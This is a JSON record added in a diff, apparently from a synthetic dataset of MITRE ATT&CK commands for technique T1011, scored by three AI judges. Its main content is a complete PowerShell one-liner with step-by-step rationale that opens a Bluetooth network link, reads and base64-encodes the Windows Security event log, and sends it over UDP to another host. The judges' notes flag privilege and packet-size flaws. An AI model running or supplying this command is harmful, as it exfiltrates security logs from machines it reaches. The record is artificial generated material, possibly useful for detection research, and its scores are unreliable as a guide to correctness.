@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
+  "explanation": "Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).",
+  "rationale_steps": [
+    "Connect to Bluetooth NAP to establish the alternate medium.",
+    "Configure the Bluetooth IP using netsh, avoiding common interfaces.",
+    "Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.",
+    "Send base64 data to a high-numbered, uncommon UDP port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-577a0b06",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quoting, valid separators, and parseable .NET and pipeline usage.",
+        "semantic_score": 3,
+        "semantic_justification": "It aligns with T1011 by using a Bluetooth PAN and binding a UDP socket to that interface, but it likely fails under non-admin privileges due to setting a static IP and reading Security.evtx requiring elevated rights.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:49:48.550161Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced parentheses, proper quoting, valid semicolon separators, correct .NET method calls, and no syntax errors throughout the pipeline.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements T1011 by connecting via Bluetooth PAN using BluetoothCL.exe, assigning a static IP to the Bluetooth network adapter, reading and base64-encoding the Security event log, then exfiltrating via UDP over the Bluetooth interface; minor realism gaps include that BluetoothCL.exe is not a widely known standard tool and reading Security.evtx typically requires elevated privileges despite 'None' being listed.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:02:44.635868Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formatted PowerShell with correct use of pipes, variables, semicolons, and balanced quoting.",
+        "semantic_score": 3,
+        "semantic_justification": "While the logic perfectly aligns with T1011, the command would likely fail in practice because base64-encoding a full Security.evtx file will exceed the 64KB size limit for a single UDP packet, and the 'netsh' and file-read operations require Administrator privileges not specified in the metadata.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:02:48.814956Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
